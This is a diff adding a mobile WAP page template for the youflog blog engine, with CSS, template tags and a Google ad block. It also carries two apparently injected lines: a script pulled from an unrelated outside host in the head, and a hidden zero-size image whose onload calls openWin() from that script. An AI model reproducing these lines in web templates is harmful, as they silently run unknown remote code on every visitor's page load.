@@ -1,0 +1,47 @@
+<!doctype html public "-//wapforum//dtd xhtml mobile 1.0//en" "http://www.wapforum.org/dtd/xhtml-mobile10.dtd"> 
+<html xmlns="http://www.w3.org/1999/xhtml"> 
+<head> 
+<meta http-equiv="content-type" content="application/xhtml+xml; charset=utf-8"/>
+<meta name="robots" content="all"/> 
+<style type="text/css">
+body{font-size:16px;}
+.waptitle{ border:#e9eef1 1px solid; background:#f6f9e7;text-align:center;}
+.title{text-align:center;} 
+#wapbody{ max-width:380px; margin:1px auto;}
+.waplist{ line-height:18px;}
+li{list-style:none outside;padding:3px 5px;}
+a{ color:#3366cc;text-decoration: none}
+a:hover{ color:#225588;background:#aacbee;text-decoration:none;}
+.pagenavi{margin-top:8px;}
+.copyright{text-align:center;margin-top:10px;}
+</style>
+<title>{{ blog.title}} -- wap</title> 
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head> 
+<body id="wapbody">
+<div class="title">{{blog.title}}</div>
+{% block content %}{% endblock %}
+<div class="copyright">
+<script type="text/javascript"><!--
+window.googleafmcrequest = {
+  client: 'ca-mb-pub-8325911329891044',
+  ad_type: 'text_image',
+  output: 'html',
+  channel: '',
+  format: '320x50_mb',
+  oe: 'utf8',
+  color_border: '336699',
+  color_bg: 'ffffff',
+  color_link: '0000ff',
+  color_text: '000000',
+  color_url: '008000',
+};
+//--></script>
+<script type="text/javascript" 
+   src="http://pagead2.googlesyndication.com/pagead/show_afmc_ads.js"></script>
+
+
+</div>
+<div class="copyright">powered by © <a href="http://iyouf.info/wap">youflog</a></div>
+<div class="copyright">报时 {% now "h:i" %}</div>
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
